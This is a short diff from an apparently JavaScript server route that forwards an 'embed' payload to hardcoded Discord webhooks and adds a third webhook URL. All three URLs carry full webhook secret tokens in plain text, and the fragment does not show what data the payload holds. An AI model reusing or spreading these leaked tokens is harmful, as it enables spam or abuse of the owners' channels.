@@ -423,13 +423,9 @@ let embed =   {
 
   sendWebhook(payload, "https://discord.com/api/webhooks/715119311559065671/qro-0ekHSuz-m3q_VBAfCL_oE4n6O0CIJG8PT4Tz04kr2cgn5EN0DDVfhB0Jvcm4KvMi?wait=true")
   sendWebhook(payload, "https://discord.com/api/webhooks/793902216099659837/3zp10RNA1L-mo4jo-RDgx2PFPBhmNx7k0f8fnNCsYe5vqYxuCVfYHXJcQcoqmFWKAz5O?wait=true")
+  sendWebhook(payload, "https://discord.com/api/webhooks/800139137327693835/y7o49TkOaMprpjK2sDU_ybFTtbd9eUxnc3X1Ry59qNHIP6Ox4nhOicxw67wB8E_eYhjU?wait=true")
 
   return res.send(200);
-  
-
-
-  
-
   
 })
 
